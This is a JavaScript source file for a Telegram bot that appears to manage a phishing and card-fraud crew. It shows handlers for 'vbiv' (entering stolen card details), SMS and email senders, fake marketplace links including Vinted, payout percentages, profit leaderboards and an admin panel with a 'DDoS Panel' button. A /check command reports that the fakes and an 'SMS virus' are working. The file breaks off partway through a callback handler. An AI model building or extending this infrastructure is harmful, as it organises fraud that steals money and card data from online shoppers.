const { Telegraf, Scenes, session } = require('telegraf')
const loggy = require('loggy')
const os = require('os-utils')
const fs = require('fs')

const getCurrentDate = require('./other/getCurrentDate')
const generateLink = require('./other/generateLink')
const config = require('../configs/config.json')

const rateLimit = require('telegraf-ratelimit')

/* scenes */
const scns = {
    register: require('./scenes/register.user.scene'),
    create: require('./scenes/create.user.scene'),
    createbbc: require('./scenes/createBBC.user.scene'),
    success: require('./scenes/success.vbiv.scene'),
    selfError: require('./scenes/selferror.vbiv.scene'),
    admin_addVbiver: require('./scenes/add_vbiver.admin.scene'),
    admin_delVbiver: require('./scenes/del_vbiver.admin.scene'),
    admin_banWorker: require('./scenes/ban_worker.admin.scene'),
    admin_message: require('./scenes/message.admin.scene'),
    sendSupportDef: require('./scenes/support.user.scene'),
    sendSMS: require('./scenes/sendSMS.user.scene'),
    sendEMAIL: require('./scenes/sendEmail.user.scene'),
    upToTeacher: require('./scenes/upToTeacher.user.scene'),
    accessTeacher: require('./scenes/descriptionTeacher.user.scene'),
    fakeScene: require('./scenes/fake.admin.scene'),
    sendAboutError: require('./scenes/sendAboutError.user.scene'),
    secretDE: require('./scenes/secret.vbiver.scene'),
    passwordALL: require('./scenes/password.vbiver.scene'),

    changeTAG: require('./scenes/changeTAG.user.scene'),
    changeBTC: require('./scenes/changeBTC.user.scene'),
    changePercent: require('./scenes/upPercent.user.scene'),
    
    admin_findUser: require('./scenes/findUser.admin.scene'),
    admin_addDomain: require('./scenes/addDomain.admin.scene'),
    admin_changeTeacherDesciption: require('./scenes/teacherChange.admin.scene'),
    admin_changeTag: require('./scenes/changeTag.admin.scene')
}

const bot = new Telegraf(config.bot.api_key, { handlerTimeout: 3500 })
const stage = new Scenes.Stage()

stage.register(
    scns.register, 
    scns.create, 
    scns.success, 
    scns.selfError, 
    scns.admin_addVbiver, 
    scns.admin_delVbiver, 
    scns.admin_banWorker, 
    scns.admin_message, 
    scns.sendSupportDef, 
    scns.sendSMS, 
    scns.upToTeacher, 
    scns.accessTeacher, 
    scns.sendEMAIL, 
    scns.createbbc, 
    scns.fakeScene, 
    scns.sendAboutError,
    scns.secretDE,
    scns.passwordALL,

    scns.changeTAG,
    scns.changeBTC,
    scns.changePercent,
    
    scns.admin_findUser,
    scns.admin_addDomain,
    scns.admin_changeTeacherDesciption,
    scns.admin_changeTag
)

const blocked = []

bot.use(session())
bot.use(stage.middleware())
bot.use((ctx, next) => {
    if (!blocked.includes(ctx.from.id)) {
        next().catch((error) => {
            loggy.warn(`hander error => ${error}`)
        })
        
        return true
    }
})

setInterval(() => {
    blocked.length = 0
    console.log(blocked)
}, 120000);
    
/* db's */
const domains = require('../database/models/domains')
const account = require('../database/models/account')
const receive = require('../database/models/receive')
const teacher = require('../database/models/teacher')
const support = require('../database/models/support')
const cassa = require('../database/models/cassa')
const cards = require('../database/models/cards')
const logs = require('../database/models/log')
const bbc = require('../database/models/bbc')

const rateLimitConf = {
    window: 3000,
    limit: 3,
    onLimitExceeded: (ctx, next) => { 
        blocked.push(ctx.from.id)
        console.log(`${ctx.from.id} tries to down us... lol :/`) 
    }
}

bot.use(rateLimit(rateLimitConf))
    
/* bot funcs */
bot.start(async (ctx) => {
    try {
        if (ctx.message.chat.id > 0) {
            if (!ctx.from.username) {
                await ctx.replyWithHTML(`<b>Перед тем как продолжить использование бота — вы обязаны поставить username!</b>`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❔ Инструкция ❔', url: `https://web-telegramm.org/telegramm/web/608-kak-zapolnit-username-v-telegramme.html` }],
                            [{ text: '❗️ Закрыть ❗️', callback_data: `❗️ Закрыть ❗️` }]
                        ]
                    }
                }).catch(async (e) => {

                    loggy.warn(`problem with telegram => ${e}`)
                })
            } else {
                await account.findOne({ tgID: ctx.from.id }).lean().then(async (res) => {
                    if (res) {
                        let about_vbiv = ``
                        let about_sms = ``

                        fs.readdir(`database/vbivers/on_vbiv`, async (err, fls) => {
                            fs.readdir(`database/smsers/`, async (err, fls_sms) => {
                                if (!err) {
                                    if (fls.length == 0) {
                                        about_vbiv = `💤 <b>На вбиве никого</b>`
                                    } else {
                                        about_vbiv = `✍️ <b>На вбиве всех стран:</b>\n🇮🇹🇵🇱🇪🇸🇩🇪\n`
                                        for (let i = 0; i < fls.length; i++) {
                                            about_vbiv += `👨‍💻 @${fls[i]}\n`
                                        }
                                    }

                                    if (fls_sms.length == 0) {
                                        about_sms = `💤 <b>На смс никого</b>`
                                    } else {
                                        about_sms = `✍️ <b>На отправке смс:</b>\n`
                                        for (let i = 0; i < fls_sms.length; i++) {
                                            about_sms += `🥷 @${fls_sms[i]}\n`
                                        }
                                    }
        
                                    let keyboard = [
                                        [{ text: '🔗 Создать ссылку', callback_data: '📦 Торговые площадки' }],
                                        [{ text: `🧢 Vinted`, callback_data: `🧢 Vinted` }, { text: '📓 Наставники', callback_data: '📓 Наставники' }],
                                        [{ text: '💬 Чаты', callback_data: '💬 Чаты' }, { text: '🖨 Мои товары', callback_data: '🖨 Мои товары' }],
                                        [{ text: '⚙️ Другое', callback_data: '⚙️ Другое' }, { text: '✍️ Сообщить о проблеме', callback_data: '✍️ Сообщить о проблеме' }]
                                    ]
        
                                    await teacher.findOne({ tgID: ctx.from.id }).lean().then(async (res) => {
                                        if (res) {
                                        keyboard.push(Array({ text: '🧑‍🏫 Панель наставника', callback_data: '🧑‍🏫 Панель наставника' }))
                                        }
                                    })
        
                                    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 2132279041) || (ctx.from.id == 5263569624) || (ctx.from.id == 5276019813)) {
                                        keyboard.push(Array({ text: '🧑‍💻 Админ панель', callback_data: `🧑‍💻 Админ панель` }))
                                    }
        
                                    if (res.status == 'ПРО Воркер') {
                                        keyboard.push(Array({ text: '🔥 Панель ПРО воркера', callback_data: `🔥 Панель ПРО воркера` }))
                                    }
        
                                    await ctx.replyWithPhoto(`https://ibb.co/LxnHvh8`, {
                                        caption: `💠 <b>Привет,</b> <code>${ctx.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🔮 Твой ID:</b> <code>${ctx.from.id}</code>\n🧿 <b>TAG:</b> <code>#${res.tag}</code>\n🧬 <b>Выплата:</b> <code>${(res.percent != undefined) ? res.percent : 60}</code><b>%</b>\n➖➖➖➖➖➖➖➖➖➖\n${about_vbiv}➖➖➖➖➖➖➖➖➖➖`,
                                        parse_mode: 'HTML',
                                        reply_markup: {
                                            inline_keyboard: keyboard,
                                            remove_keyboard: true
                                        }
                                    }).catch(async (e) => {
                                        loggy.warn(`problem with telegram => ${e}`)
                                    })
                                }
                            })
                        })
                    } else {
                        await ctx.telegram.sendMessage(config.bot.archive_chat, `➕ <b>Новый запуск бота:</b> @${ctx.from.username} (${ctx.from.id})`, { parse_mode: 'HTML' }).catch(async (e) => {
                            loggy.warn(`problem with telegram => ${e}`)
                        })

                        await ctx.replyWithPhoto('https://ibb.co/fHRbJSk', {
                            caption: `💎 <b>Привет,</b> <code>${ctx.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🪪 Твой ID:</b> <code>${ctx.from.id}</code>\n<b>📈 Твой скрытый ID:</b> <code>появится после вступления в команду</code>`,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '📨 Подать заявку 📨', callback_data: `🛡 Подать заявку 🛡` }]
                                ]
                            }
                        }).catch(async (e) => {
                            loggy.warn(`problem with telegram => ${e}`)
                        })
                    }
                })
            }
        }
    } catch (e) {
        console.log(e)
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }) 
    }
})

bot.hears('Назад', async (ctx) => {
    if (ctx.message.chat.id > 0) {
        if (!ctx.from.username) {
            await ctx.replyWithHTML(`<b>Перед тем как продолжить использование бота — вы обязаны поставить username!</b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '❔ Инструкция ❔', url: `https://web-telegramm.org/telegramm/web/608-kak-zapolnit-username-v-telegramme.html` }],
                        [{ text: '❗️ Закрыть ❗️', callback_data: `❗️ Закрыть ❗️` }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })
        } else {
            await account.findOne({ tgID: ctx.from.id }).lean().then(async (res) => {
                if (res) {
                    let about_vbiv = ``
                    let about_sms = ``

                    fs.readdir(`database/vbivers/on_vbiv`, async (err, fls) => {
                        fs.readdir(`database/smsers/`, async (err, fls_sms) => {
                            if (!err) {
                                if (fls.length == 0) {
                                    about_vbiv = `💤 <b>На вбиве никого</b>`
                                } else {
                                    about_vbiv = `✍️ <b>На вбиве всех стран:</b>\n🇮🇹🇵🇱🇪🇸🇩🇪\n`
                                    for (let i = 0; i < fls.length; i++) {
                                        about_vbiv += `👨‍💻 @${fls[i]}\n`
                                    }
                                }

                                if (fls_sms.length == 0) {
                                    about_sms = `💤 <b>На смс никого</b>`
                                } else {
                                    about_sms = `✍️ <b>На отправке смс:</b>\n`
                                    for (let i = 0; i < fls_sms.length; i++) {
                                        about_sms += `🥷 @${fls_sms[i]}\n`
                                    }
                                }
    
                                let keyboard = [
                                        [{ text: '🔗 Создать ссылку', callback_data: '📦 Торговые площадки' }],
                                        [{ text: `🧢 Vinted`, callback_data: `🧢 Vinted` }, { text: '📓 Наставники', callback_data: '📓 Наставники' }],
                                        [{ text: '💬 Чаты', callback_data: '💬 Чаты' }, { text: '🖨 Мои товары', callback_data: '🖨 Мои товары' }],
                                        [{ text: '⚙️ Другое', callback_data: '⚙️ Другое' }, { text: '✍️ Сообщить о проблеме', callback_data: '✍️ Сообщить о проблеме' }]
                                ]
    
                                await teacher.findOne({ tgID: ctx.from.id }).lean().then(async (res) => {
                                    if (res) {
                                       keyboard.push(Array({ text: '🧑‍🏫 Панель наставника', callback_data: '🧑‍🏫 Панель наставника' }))
                                    }
                                })
    
                                if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 2132279041) || (ctx.from.id == 5263569624) || (ctx.from.id == 5276019813)) {
                                    keyboard.push(Array({ text: '🧑‍💻 Админ панель', callback_data: `🧑‍💻 Админ панель` }))
                                }
    
                                if (res.status == 'ПРО Воркер') {
                                    keyboard.push(Array({ text: '🔥 Панель ПРО воркера', callback_data: `🔥 Панель ПРО воркера` }))
                                }
    
                                await ctx.replyWithPhoto(`https://ibb.co/LxnHvh8`, {
                                    caption: `💠 <b>Привет,</b> <code>${ctx.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🔮 Твой ID:</b> <code>${ctx.from.id}</code>\n🧿 <b>TAG:</b> <code>#${res.tag}</code>\n🧬 <b>Выплата:</b> <code>${(res.percent != undefined) ? res.percent : 60}</code><b>%</b>\n➖➖➖➖➖➖➖➖➖➖\n${about_vbiv}➖➖➖➖➖➖➖➖➖➖`,
                                    parse_mode: 'HTML',
                                    reply_markup: {
                                        inline_keyboard: keyboard,
                                        remove_keyboard: true
                                    }
                                }).catch(async (e) => {
                                    loggy.warn(`problem with telegram => ${e}`)
                                })
                            }
                        })
                    })
                } else {
                    await ctx.replyWithPhoto('https://ibb.co/fHRbJSk', {
                        caption: `💎 <b>Привет,</b> <code>${ctx.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🪪 Твой ID:</b> <code>${ctx.from.id}</code>\n<b>📈 Твой скрытый ID:</b> <code>появится после вступления в команду</code>`,
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '📨 Подать заявку 📨', callback_data: `🛡 Подать заявку 🛡` }]
                            ]
                        }
                    }).catch(async (e) => {
                        loggy.warn(`problem with telegram => ${e}`)
                    })
                }
            })
        }
    }
})

bot.command('menu', async (ctx) => {
    try {
        if (ctx.message.chat.id > 0) {
            if (!ctx.from.username) {
                await ctx.replyWithHTML(`<b>Перед тем как продолжить использование бота — вы обязаны поставить username!</b>`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '❔ Инструкция ❔', url: `https://web-telegramm.org/telegramm/web/608-kak-zapolnit-username-v-telegramme.html` }],
                            [{ text: '❗️ Закрыть ❗️', callback_data: `❗️ Закрыть ❗️` }]
                        ]
                    }
                }).catch(async (e) => {

                    loggy.warn(`problem with telegram => ${e}`)
                })
            } else {
                await account.findOne({ tgID: ctx.from.id }).lean().then(async (res) => {
                    if (res) {
                        let about_vbiv = ``
                        let about_sms = ``

                        fs.readdir(`database/vbivers/on_vbiv`, async (err, fls) => {
                            fs.readdir(`database/smsers/`, async (err, fls_sms) => {
                                if (!err) {
                                    if (fls.length == 0) {
                                        about_vbiv = `💤 <b>На вбиве никого</b>`
                                    } else {
                                        about_vbiv = `✍️ <b>На вбиве всех стран:</b>\n🇮🇹🇵🇱🇪🇸🇩🇪\n`
                                        for (let i = 0; i < fls.length; i++) {
                                            about_vbiv += `👨‍💻 @${fls[i]}\n`
                                        }
                                    }

                                    if (fls_sms.length == 0) {
                                        about_sms = `💤 <b>На смс никого</b>`
                                    } else {
                                        about_sms = `✍️ <b>На отправке смс:</b>\n`
                                        for (let i = 0; i < fls_sms.length; i++) {
                                            about_sms += `🥷 @${fls_sms[i]}\n`
                                        }
                                    }
        
                                    let keyboard = [
                                        [{ text: '🔗 Создать ссылку', callback_data: '📦 Торговые площадки' }],
                                        [{ text: `🧢 Vinted`, callback_data: `🧢 Vinted` }, { text: '📓 Наставники', callback_data: '📓 Наставники' }],
                                        [{ text: '💬 Чаты', callback_data: '💬 Чаты' }, { text: '🖨 Мои товары', callback_data: '🖨 Мои товары' }],
                                        [{ text: '⚙️ Другое', callback_data: '⚙️ Другое' }, { text: '✍️ Сообщить о проблеме', callback_data: '✍️ Сообщить о проблеме' }]
                                    ]
        
                                    await teacher.findOne({ tgID: ctx.from.id }).lean().then(async (res) => {
                                        if (res) {
                                        keyboard.push(Array({ text: '🧑‍🏫 Панель наставника', callback_data: '🧑‍🏫 Панель наставника' }))
                                        }
                                    })
        
                                    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 2132279041) || (ctx.from.id == 5263569624) || (ctx.from.id == 5276019813) || (ctx.from.id == 2030952071)) {
                                        keyboard.push(Array({ text: '🧑‍💻 Админ панель', callback_data: `🧑‍💻 Админ панель` }))
                                    }
        
                                    if (res.status == 'ПРО Воркер') {
                                        keyboard.push(Array({ text: '🔥 Панель ПРО воркера', callback_data: `🔥 Панель ПРО воркера` }))
                                    }
        
                                    await ctx.replyWithPhoto(`https://ibb.co/LxnHvh8`, {
                                        caption: `💠 <b>Привет,</b> <code>${ctx.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🔮 Твой ID:</b> <code>${ctx.from.id}</code>\n🧿 <b>TAG:</b> <code>#${res.tag}</code>\n🧬 <b>Выплата:</b> <code>${(res.percent != undefined) ? res.percent : 60}</code><b>%</b>\n➖➖➖➖➖➖➖➖➖➖\n${about_vbiv}➖➖➖➖➖➖➖➖➖➖`,
                                        parse_mode: 'HTML',
                                        reply_markup: {
                                            inline_keyboard: keyboard,
                                            remove_keyboard: true
                                        }
                                    }).catch(async (e) => {
                                        loggy.warn(`problem with telegram => ${e}`)
                                    })
                                }
                            })
                        })
                    } else {
                        await ctx.telegram.sendMessage(config.bot.archive_chat, `➕ <b>Новый запуск бота:</b> @${ctx.from.username} (${ctx.from.id})`, { parse_mode: 'HTML' }).catch(async (e) => {
                            loggy.warn(`problem with telegram => ${e}`)
                        })
                        
                        await ctx.replyWithPhoto('https://ibb.co/fHRbJSk', {
                            caption: `💎 <b>Привет,</b> <code>${ctx.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🪪 Твой ID:</b> <code>${ctx.from.id}</code>\n<b>📈 Твой скрытый ID:</b> <code>появится после вступления в команду</code>`,
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '📨 Подать заявку 📨', callback_data: `🛡 Подать заявку 🛡` }]
                                ]
                            }
                        }).catch(async (e) => {
                            loggy.warn(`problem with telegram => ${e}`)
                        })
                    }
                })
            }
        }
    } catch (e) {
        console.log(e)
        /* await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        }) */
    }
})

/* panel of carder */
bot.command('vbivpanel', async (ctx) => {
    fs.readdir('database/vbivers/', `utf-8`, (err, files) => {
        for (let i = 0; i < files.length; i++) {
            if (ctx.from.username == files[i]) {
                ctx.replyWithHTML(`Добро пожаловать в панель вбивера, ${ctx.from.first_name}!`, {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: 'Встать на вбив', callback_data: `vbiverUP` }, { text: 'Уйти с вбива', callback_data: 'vbiverDOWN' }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })

                return
            }
        }
    })
})

/* panel for smser */
bot.command('smspanel', async (ctx) => {
    if ((ctx.from.id == 5276019813) || (ctx.from.id == 5175594830)) {
        ctx.replyWithHTML(`Добро пожаловать в панель смсера, ${ctx.from.first_name}!`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Встать на смс', callback_data: `smserUP` }, { text: 'Уйти с смс', callback_data: 'smserDOWN' }]
                ]
            }
        }).catch(async (e) => {
            loggy.warn(`problem with telegram => ${e}`)
        })
    }    
})

/* panel of admin */
bot.command('admin', async (ctx) => {
    if (ctx.message.chat.id > 0) {
        if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 2132279041) || (ctx.from.id == 5263569624) || (ctx.from.id == 5276019813) || (ctx.from.id == 2030952071)) {
            await ctx.replyWithPhoto(`https://ibb.co/LxnHvh8`, {
                caption: `Добро пожаловать в панель администратора, ${ctx.from.first_name}!`,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '💳 Добавить вбивера 💳', callback_data: 'Добавить вбивера' }, { text: '💳 Удалить вбивера 💳', callback_data: 'Удалить вбивера' }],
                        [{ text: '💌 Рассылка по чатам', callback_data: `Рассылка по чатам` }, { text: '💌 Рассылка по пользователям', callback_data :'Рассылка по пользователям' }],
                        [{ text: '👥 Пользователи', callback_data: 'admin_Users' }, { text: `🧑‍🏫 Наставники`, callback_data: `admin_TeacherList` }],
                        [{ text: '📊 Статистика проекта', callback_data: 'Статистика проекта' }, { text: '⚙️ Сменить домен', callback_data: 'Сменить домен' }],
                        [{ text: '⚙️ Статистика сервера (показатели нагрузки)', callback_data: 'Статистика сервера' }],
                        [{ text: '🗑 Почистить БД от мусора', callback_data: `🗑 Почистить БД от мусора` }],
                        [{ text: '🔪 DDoS Panel', callback_data: '🔪 DDoS Panel' }]
                    ]
                }
            }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })
        } else {
            ctx.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    }
})

/* user commands */
bot.command('check', async (ctx) => {
    ctx.replyWithHTML(`🟢 <b>Все фейки в рабочем состоянии!</b>\n🟢 <b>СМС вирус</b> в рабочем состоянии!\n\n⚠️ <b>Вас может не пускать на ссылки, если вы используете VPN или прокси</b> ⚠️`).catch(async (e) => {
        loggy.warn(`problem with telegram => ${e}`)
    })
})
 
bot.command('stats', async (ctx) => {
    if (ctx.message.chat.id > 0) {
        await account.findOne({ tgID: ctx.from.id }).lean().then(async (acc) => {
            await ctx.replyWithHTML(`📊 <b>Ваша статистика:</b>\n🐘 <b>Всего профитов</b> <code>${acc.total_profits}</code> <b>на сумму</b> <code>${currency(acc.profit_sum_rub, { separator: ' ', symbol: '', }).format()}</code> <b>₽</b>`, { parse_mode: 'HTML' }).catch(async (e) => {
                loggy.warn(`problem with telegram => ${e}`)
            })
        })
    }
})

bot.command('fake', async (ctx) => {
    if (ctx.message.chat.id > 0) {
        if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) ||(ctx.from.id == 5008427383) || (ctx.from.id == 746818416) || (ctx.from.id == 5276019813) || (ctx.from.id == 2030952071)) {
            ctx.scene.enter('fakescene')
        }
    }
})

bot.command('kassa', async (ctx) => {
    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 2132279041) || (ctx.from.id == 5263569624) || (ctx.from.id == 5276019813) || (ctx.from.id == 2030952071)) {
        let todayDate = getCurrentDate()

        let today = new Date();
        let dd = String(today.getDate()).padStart(2, '0');
        let mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
        let yyyy = today.getFullYear();

        await ctx.replyWithHTML(`📊 <b>Выберите за какую дату посмотреть статистику</b>`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Сегодня', callback_data: `ktoday_${todayDate}` }],
                    [{ text: 'Вчера', callback_data: `kyest_0${dd-1}/${mm}/${yyyy}` }],
                    [{ text: 'Позавчера', callback_data: `kdyest_0${dd-2}/${mm}/${yyyy}` }],
                    [{ text: 'За всё время', callback_data: `kall_none` }]
                ]
            }
        })
    }
})

bot.command('top', async (ctx) => {
    await account.find({}).lean().sort({ profit_sum_rub: -1 }).then(async (res) => {
        let strTop = `🔝 <b>ТОП воркеров</b> 🔝\n\n`
        for (let i = 1; i < 10; i++) {
            strTop += `${i}. #${res[i].tag}: <code>${res[i].total_profits}</code> <b>профита на сумму</b> <code>${currency(parseInt(res[i].profit_sum_rub), { separator: ' ', symbol: '', }).format()}</code> <b>₽</b>\n`
        }

        await ctx.reply(strTop, { parse_mode: 'HTML' })
    })
})

bot.command('topvbiv', async (ctx) => {
    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 812283134) || (ctx.from.id == 5263569624) || (ctx.from.id == 5008427383) || (ctx.from.id == 2030952071)) {
        let cassa_res = {
            raze: 0,
            krot: 0
        }
        
        await cassa.find({}).lean().then(async (res) => {
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'h0wtogetm0ney') {
                    cassa_res.krot += parseInt(res[i].vbiver)
                }
            }
    
            for (let i = 0; i < res.length; i++) {
                if (res[i].who_vbiver == 'rzzzxxxxsss') {
                    cassa_res.raze += parseInt(res[i].vbiver)
                }
            }
    
            let statsStr = `🔝 <b>ТОП Вбиверов</b> 🔝\n\n1️⃣ firstPlace\n2️⃣ secondPlace\n\n<b>От ТСа:</b> мдааааа ну secondPlace123 и лох... может уволить его?`
            
            if (cassa_res.raze > cassa_res.krot) {
                statsStr = statsStr.replace('firstPlace', `@rzzzxxxxsss`)
                statsStr = statsStr.replace('secondPlace', '@h0wtogetm0ney')
                statsStr = statsStr.replace('secondPlace123', '@h0wtogetm0ney')
            } else {
                statsStr = statsStr.replace('firstPlace', `@h0wtogetm0ney`)
                statsStr = statsStr.replace('secondPlace', '@rzzzxxxxsss')
                statsStr = statsStr.replace('secondPlace123', '@rzzzxxxxsss')
            }
    
            await ctx.telegram.sendPhoto(-1001556791065, 'http://comparecamp.com/media/uploads/2020/05/minecraft-main.jpg', {
                caption: `${statsStr}`,
                parse_mode: 'HTML'
            })
    
        })
    }
})

bot.command('statkyrator', async (ctx) => {
    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 812283134) || (ctx.from.id == 5263569624) || (ctx.from.id == 5008427383) || (ctx.from.id == 2030952071)) {
        // await cassa.find({ date: getCurrentDate() }).lean().then(async (res) => {
        await ctx.reply('небольшие трудности появились с ними, на последок их оставил')
        // })
    }
})

bot.command('statmailer', async (ctx) => {
    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 812283134) || (ctx.from.id == 5263569624) || (ctx.from.id == 5008427383) || (ctx.from.id == 2030952071)) {
        await cassa.find({ date: getCurrentDate(), emailer: { $gt: 0 } }).lean().then(async (data) => {
            let res = {
                len: 0,
                total: 0
            }

            res.len = data.length
            for (let i = 0; i < data.length; i++) {
                if (data[i].emailer != NaN) {
                    res.total += parseInt(data[i].emailer)
                }
            }

            await ctx.telegram.sendMessage(-1001556791065, `📩 <b>За</b> <code>${getCurrentDate()}</code> <b>с помощью емейлера было совершено</b> <code>${res.len}</code> <b>профитов, доля мейлера составляет ${currency(parseInt(res.total), { separator: ' ', symbol: '', }).format()} ₽</b> 📩`, { parse_mode: 'HTML' })
        })
    }
})

bot.command('statsms', async (ctx) => {
    if ((ctx.from.id == config.bot.admin_id) || (ctx.from.id == 1140638587) || (ctx.from.id == 812283134) || (ctx.from.id == 5263569624) || (ctx.from.id == 5008427383)) {
        await cassa.find({ date: getCurrentDate(), smser: { $gt: 0 } }).lean().then(async (data) => {
            let res = {
                len: 0,
                total: 0
            }

            res.len = data.length
            for (let i = 0; i < data.length; i++) {
                if (data[i].smser != NaN) {
                    res.total += parseInt(data[i].smser)
                }
            }

            await ctx.telegram.sendMessage(-1001556791065, `📲 <b>За</b> <code>${getCurrentDate()}</code> <b>с помощью Гуся было совершено</b> <code>${res.len}</code> <b>профитов, доля Гуся составляет ${currency(parseInt(res.total), { separator: ' ', symbol: '', }).format()} ₽</b> 📲`, { parse_mode: 'HTML' })
        })
    }
})

bot.command('adm', async (ctx) => {
    await ctx.replyWithPhoto('https://i.ibb.co/tYmQj6M/1.jpg', {
        caption: '<b>Контакты админ-состава:</b>\n\n<b>🥷 ТС:</b> @halloset\n🤵 <b>Зам:</b> @Love6money\n🧑‍💻 <b>Хелпер:</b> @mizzzzy',
        parse_mode: 'HTML'
    })
})

bot.command('vbiver', async (ctx) => {
    fs.readdir('database/vbivers/on_vbiv', async (err, files) => {
        let about_vbiv = ``

        if (files.length == 0) {
            about_vbiv = `💤 <b>На вбиве никого</b>`
        } else {
            about_vbiv = `✍️ <b>На вбиве:</b>\n\n`
            for (let i = 0; i < files.length; i++) {
                about_vbiv += `👨‍💻 @${files[i]}\n`
            }
        }

        await ctx.replyWithPhoto('https://i.ibb.co/cLwgJ9f/photo-2022-03-23-20-13-20.jpg', {
            caption: `${about_vbiv}\n👨‍💻 <b>Хелпер:</b> @mizzzzy`,
            parse_mode: 'HTML'
        })
    })
})

bot.on('callback_query', async (q) => {
    /* await q.answerCbQuery(false, { cache_time: 1000 }) */
    let data = q.update.callback_query.data

    /* pre reg (first start without username) */
    if (data == '❗️ Закрыть ❗️') {
        q.telegram.deleteMessage(q.chat.id, q.update.callback_query.message.message_id)
    }

    /* do a register */
    if (data == '🛡 Подать заявку 🛡') {
        q.scene.enter('registerScene')
    }

    /* back to menu */
    if (data == '⬅️ Назад') {
        await account.findOne({ tgID: q.from.id }).lean().then(async (res) => {
            if (!res) {
                await q.editMessageCaption(`Ошибка...`).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })
            } else {
                let about_vbiv = ``
                let about_sms = ``
                fs.readdir(`database/vbivers/on_vbiv`, async (err, fls) => {
                    fs.readdir(`database/smsers/`, async (err, fls_sms) => {
                        if (!err) {
                            if (fls.length == 0) {
                                about_vbiv = `💤 <b>На вбиве никого</b>`
                            } else {
                                about_vbiv = `✍️ <b>На вбиве всех стран:</b>\n🇮🇹🇵🇱🇪🇸🇩🇪\n`
                                for (let i = 0; i < fls.length; i++) {
                                    about_vbiv += `👨‍💻 @${fls[i]}\n`
                                }
                            }

                            if (fls_sms.length == 0) {
                                about_sms = `💤 <b>На смс никого</b>`
                            } else {
                                about_sms = `✍️ <b>На отправке смс:</b>\n`
                                for (let i = 0; i < fls_sms.length; i++) {
                                    about_sms += `🥷 @${fls_sms[i]}\n`
                                }
                            }

                            let keyboard = [
                                        [{ text: '🔗 Создать ссылку', callback_data: '📦 Торговые площадки' }],
                                        [{ text: `🧢 Vinted`, callback_data: `🧢 Vinted` }, { text: '📓 Наставники', callback_data: '📓 Наставники' }],
                                        [{ text: '💬 Чаты', callback_data: '💬 Чаты' }, { text: '🖨 Мои товары', callback_data: '🖨 Мои товары' }],
                                        [{ text: '⚙️ Другое', callback_data: '⚙️ Другое' }, { text: '✍️ Сообщить о проблеме', callback_data: '✍️ Сообщить о проблеме' }]
                            ]

                            await teacher.findOne({ tgID: q.from.id }).lean().then(async (res) => {
                                if (res) {
                                   keyboard.push(Array({ text: '🧑‍🏫 Панель наставника', callback_data: '🧑‍🏫 Панель наставника' }))
                                }
                            })

                            if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
                                keyboard.push(Array({ text: '🧑‍💻 Админ панель', callback_data: `🧑‍💻 Админ панель` }))
                            }

                            if (res.status == 'ПРО Воркер') {
                                keyboard.push(Array({ text: '🔥 Панель ПРО воркера', callback_data: `🔥 Панель ПРО воркера` }))
                            }

                            await q.editMessageCaption(`💠 <b>Привет,</b> <code>${q.from.first_name}</code><b>!</b> 🙋🏻\n\n<b>🔮 Твой ID:</b> <code>${q.from.id}</code>\n🧿 <b>TAG:</b> <code>#${res.tag}</code>\n🧬 <b>Выплата:</b> <code>${(res.percent != undefined) ? res.percent : 60}</code><b>%</b>\n➖➖➖➖➖➖➖➖➖➖\n${about_vbiv}➖➖➖➖➖➖➖➖➖➖`,
                            {
                                parse_mode: 'HTML',
                                reply_markup: {
                                    inline_keyboard: keyboard,
                                    remove_keyboard: true
                                }
                            }).catch(async (e) => {
                                loggy.warn(`problem with telegram => ${e}`)
                            })
                        }
                    })
                })
            }
        })
    }

    if (data == '⬅️ Назаддддд') {
        await account.findOne({ tgID: q.from.id }).lean().then(async (res) => {
            if (!res) {
